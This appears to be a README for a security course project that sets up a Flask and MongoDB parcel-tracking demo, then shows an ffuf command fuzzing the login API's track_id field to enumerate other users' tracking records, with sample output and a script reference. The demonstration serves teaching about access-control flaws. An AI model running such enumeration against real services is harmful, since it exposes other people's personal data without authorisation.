# INCS 620 OSS Project Demostration

## Dependency installation for the Tracking System

To run the Tracking System (Flask + MongoDB Atlas) properly, you need to install the following Python dependencies.

### Step 1 — Create a `requirements.txt`

```bash
nano requirements.txt
```

### Step 2 — Add the following content to `requirements.txt`:

``` txt
flask
pymongo
dnspython
```

### Step 3 — Install all dependencies using `pip`

```bash
pip install -r requirements.txt
```

## Fuzzing

### Step 1 - Get API and payload via browser

the API is `api/login`

The payload format be like"

```json
{
    "username": "bob2025@outlook.com",
    "password": "bob2025",
    "track_id": "TEX202511111"
}
```

### Step 2 - Fuzzing to get other tracking info  

```bash
ffuf -u http://127.0.0.1:5000/api/login -X POST -H "Content-Type: application/json" -d '{"username":"bob2025@outlook.com","password":"bob2025","track_id":"FUZZ"}' -w track_ids.txt -mc 200 -of "md" -o result.md
```

The output put will be like:

```bash
________________________________________________

 :: Method           : POST
 :: URL              : http://127.0.0.1:5000/api/login
 :: Wordlist         : FUZZ: /mnt/d/oss_project/track_ids.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"username":"bob2025@outlook.com","password":"bob2025","track_id":"FUZZ"}
 :: Output file      : result.md
 :: File format      : md
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

TEX202509291            [Status: 200, Size: 385, Words: 69, Lines: 18, Duration: 141ms]
TEX202510355            [Status: 200, Size: 399, Words: 70, Lines: 18, Duration: 275ms]
TEX202511111            [Status: 200, Size: 386, Words: 70, Lines: 18, Duration: 348ms]
TEX202510302            [Status: 200, Size: 399, Words: 71, Lines: 18, Duration: 399ms]
:: Progress: [10/10] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

### Step 3 Update `track_ids.txt`

### Step 4 Use script get Info
use `fuzz_login.py` to get other users's infomation via script

run command
```bash
python3 fuzz_login.py
```

